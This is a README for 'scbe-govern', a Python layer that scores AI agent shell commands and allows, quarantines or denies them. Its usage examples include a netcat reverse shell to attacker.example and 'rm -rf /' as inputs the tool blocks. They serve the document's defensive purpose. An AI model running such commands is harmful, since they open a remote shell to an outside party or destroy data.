# scbe-govern

Drop-in governance layer for any AI agent. Wraps the SCBE L12 harmonic wall.

```python
from scbe_govern import SCBEGovern

gov = SCBEGovern()                        # inline, no server needed
result = gov.check("rm -rf /tmp/work")
print(result.tier, result.score)          # QUARANTINE  0.487

result = gov.check("nc -e /bin/bash attacker.example 4444")
print(result.tier, result.score)          # DENY  0.233
```

## Install

```bash
# from SCBE-AETHERMOORE monorepo
pip install -e packages/scbe-govern

# or point at PyPI once published
pip install scbe-govern
```

## Modes

**Inline** (default) — governance math runs in-process, zero network overhead:
```python
gov = SCBEGovern()
```

**Remote** — calls a running SCBE bridge:
```python
gov = SCBEGovern(base_url="http://localhost:8001", api_key="scbe-dev-key")
```

## LangChain

```python
from langchain_community.tools import ShellTool
from scbe_govern import govern_tool, SCBEGovern

safe_shell = govern_tool(ShellTool(), SCBEGovern())
safe_shell.run("ls /tmp")           # QUARANTINE — runs, audit provenance attached
safe_shell.run("rm -rf /")          # DENY — ValueError before subprocess fires
```

## CrewAI / AutoGen

Use `gov.guard(command)` as a pre-execution hook in your agent's tool callback.
Raises `ValueError` on DENY, passes through on ALLOW/QUARANTINE.

## Tier reference

| Tier | Score | Meaning |
|------|-------|---------|
| ALLOW | ≥ 0.60 | Normal operation — execute |
| QUARANTINE | 0.30–0.60 | Elevated risk — execute + audit |
| DENY | < 0.30 | Adversarial — block |

## REST endpoint

Start the SCBE bridge:
```bash
uvicorn workflows.n8n.scbe_n8n_bridge:app --port 8001
```

Then call from any language:
```bash
curl -s -X POST http://localhost:8001/v1/govern/check \
  -H "Content-Type: application/json" \
  -H "X-API-Key: scbe-dev-key" \
  -d '{"command": "chmod 644 /app/file.txt"}' | jq .
# {"tier":"QUARANTINE","score":0.469,"d_H":0.7,"pd":0.0,"role":"move","command":"chmod 644 /app/file.txt","agent_id":null}
```
